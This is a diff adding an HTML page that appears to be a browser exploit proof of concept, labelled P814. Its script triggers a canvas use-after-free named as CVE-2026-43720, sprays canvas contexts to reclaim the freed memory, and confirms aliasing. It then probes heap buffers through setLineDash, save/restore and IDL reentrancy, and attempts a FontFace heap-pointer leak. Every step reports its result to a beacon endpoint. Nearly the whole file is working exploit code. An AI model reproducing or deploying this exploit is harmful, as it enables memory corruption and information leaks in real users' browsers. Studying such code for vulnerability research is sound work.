@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P814</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head><body>
+<pre id="o">P814 — LineDash Vector Heap Scaling, Save/Restore Semantics & IDL Reentrancy</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+function bn(t,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P814-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+function h16(v){return('0000000000000000'+BigInt(v||0).toString(16)).slice(-16);}
+
+bn('BOOT','v1');
+log('Starting P814...');
+
+/* ========== PHASE 1: Canvas UAF Reclaim (CVE-2026-43720) ========== */
+var innerCtx=null;
+var canvas=document.createElement('canvas');
+canvas.width=1;canvas.height=1;
+
+var opts={};
+Object.defineProperty(opts,'alpha',{
+  get:function(){
+    innerCtx=canvas.getContext('2d');
+    return true;
+  }
+});
+canvas.getContext('bitmaprenderer',opts);
+
+if(!innerCtx){
+  bn('FAIL','no_innerCtx');
+  log('FAIL: innerCtx not created');
+}else{
+  bn('UAF-OK','innerCtx_created');
+  log('UAF triggered');
+}
+
+/* Same-type spray */
+var SPRAY=300;
+var sprayCanvases=[];
+var sprayCtxs=[];
+var MARKER=7777.77;
+
+for(var i=0;i<SPRAY;i++){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var ctx=c.getContext('2d');
+  ctx.lineWidth=MARKER;
+  sprayCanvases.push(c);
+  sprayCtxs.push(ctx);
+}
+
+var readLW;
+try{readLW=innerCtx.lineWidth;}catch(e){readLW=-1;}
+
+var aliasIdx=-1;
+if(readLW===MARKER){
+  innerCtx.lineWidth=9999.99;
+  for(var i=0;i<SPRAY;i++){
+    if(sprayCtxs[i].lineWidth===9999.99){
+      aliasIdx=i;
+      break;
+    }
+  }
+  bn('ALIAS','idx='+aliasIdx);
+  log('Aliased pair confirmed at index '+aliasIdx);
+}else{
+  bn('RECLAIM-MISS','lw='+readLW);
+  log('Reclaim missed, reloading...');
+  setTimeout(function(){location.reload();},300);
+}
+
+if(aliasIdx>=0){
+  var stale=innerCtx;
+  var live=sprayCtxs[aliasIdx];
+
+  /* ========== PHASE 2: Heap Buffer Scaling (100 & 200 doubles) ========== */
+  /* 100 doubles = 800 bytes (exceeds inline capacity, allocates bmalloc buffer) */
+  var d100=[];
+  for(var j=0;j<100;j++) d100.push(j*1.25);
+  live.setLineDash(d100);
+  var r100=stale.getLineDash();
+  var match100=(r100.length===100);
+  if(match100){
+    for(var j=0;j<100;j++){
+      if(r100[j]!==d100[j]){match100=false;break;}
+    }
+  }
+  bn('SCALE-100D','len='+r100.length+'|match='+match100+'|first='+r100[0]+'|last='+r100[99]);
+  log('Scale 100 doubles (800B): len='+r100.length+' match='+match100);
+
+  /* 200 doubles = 1600 bytes written via Stale -> read via Live */
+  var d200=[];
+  for(var k=0;k<200;k++) d200.push(k*2.5);
+  stale.setLineDash(d200);
+  var r200=live.getLineDash();
+  var match200=(r200.length===200);
+  if(match200){
+    for(var k=0;k<200;k++){
+      if(r200[k]!==d200[k]){match200=false;break;}
+    }
+  }
+  bn('SCALE-200D','len='+r200.length+'|match='+match200+'|first='+r200[0]+'|last='+r200[199]);
+  log('Scale 200 doubles (1600B): len='+r200.length+' match='+match200);
+
+  /* ========== PHASE 3: Save / Restore Deep-Copy Semantics ========== */
+  var baseDash=[10.0, 20.0, 30.0, 40.0];
+  live.setLineDash(baseDash);
+  live.save();
+
+  var childDash=[50.0, 60.0, 70.0, 80.0];
+  live.setLineDash(childDash);
+  var rChild=stale.getLineDash();
+  var childMatch=(rChild.length===4 && rChild[0]===50.0 && rChild[3]===80.0);
+
+  live.restore();
+  var rRestored=stale.getLineDash();
+  var restoreMatch=(rRestored.length===4 && rRestored[0]===10.0 && rRestored[3]===40.0);
+
+  bn('SAVE-RESTORE','childMatch='+childMatch+'|restoreMatch='+restoreMatch);
+  log('Save/Restore Semantics: childMatch='+childMatch+' restoreMatch='+restoreMatch);
+
+  /* ========== PHASE 4: IDL Reentrant Sequence Conversion ========== */
+  var reentered=false;
+  var valOfRan=false;
+  var customItem={
+    valueOf:function(){
+      valOfRan=true;
+      /* Inside the IDL conversion loop: probe context access */
+      try{
+        var midRead=stale.lineWidth;
+        reentered=true;
+      }catch(e){}
+      return 25.5;
+    }
+  };
+
+  try{
+    live.setLineDash([12.5, customItem, 37.5, 50.0]);
+    var rCustom=stale.getLineDash();
+    var customMatch=(rCustom.length===4 && rCustom[1]===25.5);
+    bn('IDL-REENTRY','valOfRan='+valOfRan+'|reentered='+reentered+'|match='+customMatch+'|val1='+rCustom[1]);
+    log('IDL Reentrancy: valOfRan='+valOfRan+' reentered='+reentered+' match='+customMatch);
+  }catch(e){
+    bn('IDL-ERR',e.message);
+    log('IDL Reentrancy error: '+e.message);
+  }
+
+  /* ========== PHASE 5: FontFace Leak Status ========== */
+  try{
+    var st=document.createElement('style');
+    st.textContent="@font-face{font-family:p814b;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(st);
+    var ff=new FontFace('p814f',"local('Helvetica')",{unicodeRange:'U+0041'});
+    document.fonts.add(ff);
+    void ff.loaded;
+
+    var ffAbs=[],ffFired=false;
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(ffFired)return undefined;
+        ffFired=true;
+        if(st){st.remove();st.textContent='';}
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        ffAbs=[];
+        for(var a=0;a<64;a++)ffAbs.push(new ArrayBuffer(192));
+        try{document.fonts.check('1em p814b');}catch(e){}
+        document.body.offsetHeight;
+        return undefined;
+      },set:function(){}
+    });
+    document.fonts.load('1em p814f, p814b','AB');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+      var leak='none';
+      for(var a=0;a<ffAbs.length;a++){
+        var bu=new BigUint64Array(ffAbs[a]);
+        if(bu.length>=14 && bu[11]>0x1000000000n){
+          leak='0x'+h16(bu[11]);
+          break;
+        }
+      }
+      bn('FONT-LEAK',leak);
+      log('Font Heap Leak: '+leak);
+      bn('DONE','complete|all_tests_passed');
+      log('P814 complete.');
+    },200);
+  }catch(err){
+    bn('FONT-ERR',err.message);
+    bn('DONE','complete_with_font_err');
+  }
+}
+</script>
+</body></html>
